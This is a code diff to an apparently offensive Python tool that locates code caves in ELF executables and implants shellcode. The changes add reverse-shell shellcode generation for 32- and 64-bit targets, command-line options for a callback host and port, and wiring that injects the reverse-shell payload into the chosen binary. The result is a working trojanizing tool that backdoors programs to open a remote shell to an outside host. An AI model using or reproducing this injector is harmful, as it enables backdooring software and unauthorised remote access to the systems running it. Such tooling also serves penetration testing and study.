@@ -1,9 +1,10 @@
 #!/usr/bin/python3
-import binascii
 import argparse
-import sys
-import struct
+import binascii
 import logging
+import netaddr
+import struct
+import sys
 from ctypes import *
 from os import path
 
@@ -11,6 +12,9 @@ from elf import Elf64_Ehdr
 from elf import Elf64_Phdr
 from elf import Elf32_Ehdr
 from elf import Elf32_Phdr
+
+from shellcode import x64_reverse_shell
+from shellcode import x32_reverse_shell
 
 COLORS = {"yellow" : "\033[33;1m",
           "red"    : "\033[31;1m",
@@ -204,9 +208,11 @@ def inject_shellcode(elf,txt_segment,payload,args):
 
     # rebuild payload with the target binary's previous entry point
     #shellcode = payload[:0xe] + struct.pack("<I",elf.e_entry) + payload[0x12:]
-    shellcode = payload[:0xe] + struct.pack("<I",elf.e_entry) + payload[0x12:]
-
-    logger.debug("New payload size is: %d" % len(shellcode))
+    if not args.reverse:
+        shellcode = payload[:0xe] + struct.pack("<I",elf.e_entry) + payload[0x12:]
+        logger.debug("New payload size is: %d" % len(shellcode))
+    else:
+        shellcode = payload
 
     # read in the target binary in order to inject payload into
     with open(args.file,'rb') as f:
@@ -253,6 +259,23 @@ def shellcode(payload):
 
     return shellcode
 
+def generate_shellcode(elf, IP, PORT):
+    '''Generate the shellcode based off of the architecture
+       of the target binary as well as the provided IP/PORT'''
+
+    arch = elf.elf_class
+    entry = elf.e_entry
+
+    if arch == "ELF32":
+        shellcode = x32_reverse_shell(IP,PORT,entry)
+    elif arch == "ELF64":
+        shellcode = x64_reverse_shell(IP,PORT,entry)
+
+    logger.info("Shellcode {}B in size.".format(len(shellcode)))
+
+    return shellcode
+
+
 def file_check(file_name):
     if path.exists(file_name):
         return file_name
@@ -261,8 +284,23 @@ def file_check(file_name):
         print("Failed to open file.")
         sys.exit()
 
-'''def change_loggerlevel(level):
-    context.logger_level = level'''
+def verify_ip(addr):
+    if netaddr.valid_ipv4(addr):
+        return addr
+    else:
+        print("Invalid IP Address supplied.")
+        sys.exit()
+
+def verify_port(port):
+    try:
+        port = int(port)
+        if port < 0 or port > 65535:
+            print("Invalid port range")
+            sys.exit()
+        return port
+    except Exception as e:
+        print(e)
+        sys.exit()
 
 def args():
 
@@ -277,14 +315,20 @@ def args():
             help="Implant shellcode into code cave.")
     parser.add_argument("-t", dest="test", action="store_true",
             help="Test building the new shellcode. Do not actually inject.")
+    parser.add_argument("-c", dest="shellcode", metavar="", type=file_check, default="shellcode",
+            help="Supply custom shellcode to inject into ELF code cave. Can be specified by filename or no arg. Ensure that the filename is \"shellcode\".")
+    parser.add_argument("-R", dest="reverse", action="store_true",
+            help="Generate shellcode that establishes a reverse TCP connection. Default uses 127.0.0.1:9000. Change defaults with -H or -P.")
+    parser.add_argument("-H", dest="host", type=verify_ip, default="127.0.0.1",
+            help="Host IP address for shellcode callback.")
+    parser.add_argument("-P", dest="port", type=verify_port, default=9000,
+            help="Port for shellcode socket.")
+    parser.add_argument("file", metavar="FILE", type=file_check,
+            help="Provide a file to check for code cave.")
     parser.add_argument("-v", dest="verbose", action="store_true",
             help="Enable verbose loggerging.")
     parser.add_argument("-s", dest="silent", action="store_true",
             help="Enable silent mode.")
-    parser.add_argument("-c", dest="shellcode", type=file_check, default="shellcode",
-            help="Shellcode to inject into ELF code cave.")
-    parser.add_argument("file", metavar="FILE", type=file_check,
-            help="Provide a file to check for code cave.")
 
     return parser.parse_args()
 
@@ -310,19 +354,19 @@ if __name__ == '__main__':
         sys.exit()
     
     # calculate shellcode size and collect only the payload portion of the file
-    if args.shellcode:
-        code = shellcode(args.shellcode)
+    if args.reverse:
+        shellcode = generate_shellcode(elf,args.host,args.port)
     else:
-        code = shellcode("shellcode")
+        shellcode = shellcode(args.shellcode)
 
     # locate offsets and implant if possible and indicated at the commandline
     if args.locate or args.implant or args.test:
         logger.info("Attempting to locate code cave in file: %s" % args.file)
 
-        text_segment = locate_codecave(load_sections,len(code))
+        text_segment = locate_codecave(load_sections,len(shellcode))
 
         if args.implant or args.test:
-            inject_shellcode(elf,text_segment,code,args)
+            inject_shellcode(elf,text_segment,shellcode,args)
 
 
 
